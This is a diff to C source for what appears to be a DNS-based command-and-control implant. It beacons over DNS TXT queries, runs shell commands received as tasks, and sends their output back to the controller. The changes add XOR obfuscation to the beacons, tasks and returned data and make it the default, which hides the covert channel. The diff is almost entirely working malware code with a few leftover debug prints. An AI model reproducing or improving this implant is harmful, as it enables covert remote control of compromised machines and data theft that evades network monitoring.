@@ -11,6 +11,7 @@
 #include "messagetypes.h"
 #include "base64.c"
 #define UUID 0xffff
+#define XOR_CHAR 0x33
  
 char dns_servers[10][100];
 int dns_server_count = 0;
@@ -34,7 +35,10 @@ void get_dns_servers();
 int hostname_to_ip(char*, char*);
 int execute(char*, char*);
 struct Task* get_task_from_response(char *, int);
-struct Beacon* create_beacon(int, int, char *, int);
+struct Beacon* create_beacon(int, int, char *, unsigned short);
+void encode(unsigned char*, unsigned short, int);
+void decode(unsigned char*, unsigned short, int);
+void xor(unsigned char*, unsigned short);
 
 //DNS header structure
 struct DNS_HEADER
@@ -99,10 +103,23 @@ typedef struct
     struct QUESTION *ques;
 } QUERY;
 
-void xor(char b, char * string, int string_len) {
+void encode(unsigned char* string, unsigned short string_len, int format) {
+    if (format == FORMAT_XOR) {
+        xor(string, string_len);
+    }
+}
+
+void decode(unsigned char* string, unsigned short string_len, int format) {
+    if (format == FORMAT_XOR) {
+        xor(string, string_len);
+    }
+}
+
+void xor(unsigned char* string, unsigned short string_len) {
     int i;
-    for(i=0; i<string_len;i++)
-        string[i] ^= b;
+    for(i=0; i<string_len;i++) {
+        string[i] ^= ((int)XOR_CHAR);
+    }
 }
  
 int main( int argc , char *argv[])
@@ -124,9 +141,10 @@ int main( int argc , char *argv[])
     // Append the Beacon
     struct Beacon *beacon = NULL;
     beacon = (struct Beacon*)malloc(sizeof(struct Beacon));
-    beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
-    //beacon->type = (FORMAT_XOR << 4) | BEACON_PING;
+    //beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
+    beacon->type = (FORMAT_XOR << 4) | BEACON_PING;
     beacon->uuid = UUID;
+    xor((unsigned char*)&beacon->uuid, 2);
     ngethostbyname(hostname, T_TXT, beacon, 3);
  
     return 0;
@@ -331,15 +349,23 @@ void ngethostbyname(unsigned char *host, int query_type, struct Beacon* beacon, 
             //printf("task->type: %d\n", task->type);
             //printf("task->data_length: %d\n", task->data_length);
             //printf("task->data: %s\n", task->data);
+            printf("task->type = 0x%02x\n", task->type);
+            if ((task->type >> 4) == FORMAT_XOR) {
+                printf("Received XOR Task\n");
+                decode((unsigned char*)&task->data_length, 2, FORMAT_XOR);
+                decode((unsigned char*)&task->data, task->data_length, FORMAT_XOR);
+            }
 
-            if (task->type == TASK_CLI) {
+
+            if ((task->type & 0xf) == TASK_CLI) {
                 char *output = malloc(1024);
                 struct Beacon* beacon;
 
                 if (execute(task->data, output) != 0) {
                     return;
                 }
-                beacon = create_beacon(FORMAT_PLAIN, BEACON_DATA, output, strlen(output));
+                beacon = create_beacon(FORMAT_XOR, BEACON_DATA, output, strlen(output));
+                //beacon = create_beacon(FORMAT_PLAIN, BEACON_DATA, output, strlen(output));
 
                 //printf("beacon->data = %s\n", beacon->data);
 
@@ -503,13 +529,17 @@ int execute(char * cmd, char * output)
   return rc;
 }
 
-struct Beacon* create_beacon(int format, int type, char * data, int data_length) {
+struct Beacon* create_beacon(int format, int type, char * data, unsigned short data_length) {
     struct Beacon* beacon;
 
     beacon = (struct Beacon*)malloc(sizeof(struct Beacon) + data_length);
-    beacon->type = ((format & 0x0f << 4) & 0xf0) | (type & 0x0f);
+    beacon->type = ((format << 4) & 0xf0) | (type & 0x0f);
+    printf("XXXXXXXXXXXXXX beacon->type = %d\n", beacon->type);
     beacon->uuid = UUID;
+    encode((unsigned char*)&beacon->uuid, 2, format);;
     beacon->data_length = data_length;
+    encode((unsigned char*)&beacon->data_length, 2, format);
     memcpy(beacon->data, data, data_length);
+    encode((unsigned char*)&beacon->data, data_length, format);
     return beacon;
 }
